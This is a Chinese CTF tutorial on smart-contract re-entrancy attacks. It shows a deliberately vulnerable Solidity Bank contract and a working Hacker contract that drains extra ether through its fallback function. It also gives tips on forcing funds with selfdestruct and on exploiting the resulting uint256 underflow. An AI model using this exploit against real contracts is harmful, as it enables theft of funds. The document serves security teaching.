# Re-Entrancy

重入攻击是智能合约中的经典攻击。以太坊The DAO项目遭受的重入攻击直接导致了以太坊（ETH）和以太坊经典（ETC）的硬分叉。

## 原理
假设有一个银行合约实现了以下取款功能，在`balanceOf[msg.sender]`充足时，合约会转账相应数量的以太币给调用者，并且将`balanceOf`减去相应值：

```solidity
contract Bank {
    mapping(address => uint256) public balanceOf;
    ...
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balanceOf[msg.sender] -= amount;
    }
}
```

这个实现的问题在于，“先给钱后记账”。在以太坊中，合约的调用者可以是另一个智能合约，转账时收款合约的fallback函数会被调用。若fallback函数内再一次调用了对方的withdraw函数，由于此时`balanceOf`尚未减少，require的条件仍然满足，导致可以再次取款。需要注意的是，fallback函数需要限制重入的次数，否则会因为无限地循环调用，导致gas不足。假设攻击合约的存款有1 ether，可以如下实现取出2 ether：

```
contract Hacker {
    bool status = false;
    Bank b;

    constructor(address addr) public {
        b = Bank(addr);
    }

    function hack() public {
        b.withdraw(1 ether);
    }

    function() public payable {
        if (!status) {
            status = true;
            b.withdraw(1 ether);
        }
    }
}
```

此外有几个注意点：

- 目标合约使用call发送以太币时，默认提供所有剩余gas；call操作改为对提款者合约的调用亦可实现攻击；但如果使用transfer或者send来发送以太币，只有2300 gas供攻击合约使用，是不足以完成重入攻击的。
- 执行重入攻击前，需要确认目标合约有足够的以太币来向我们多次转账。如果目标合约没有payable的fallback函数，则需要新建一个合约，通过`selfdestruct`自毁强制转账。
- 上述fallback实现中，先改写`status`后重入。如果反过来则还是会无限循环调用，这和重入漏洞的道理是一致的。

重入漏洞与整数下溢出漏洞关联密切。在上述攻击后，攻击合约的存款由1 ether变为-1 ether。但注意到存款由uint256保存，负数实际上保存为一个极大的正数，后续攻击合约可以继续使用这个大数额的存款。

## 题目

强网杯2019 babybank
N1CTF2019 h4ck
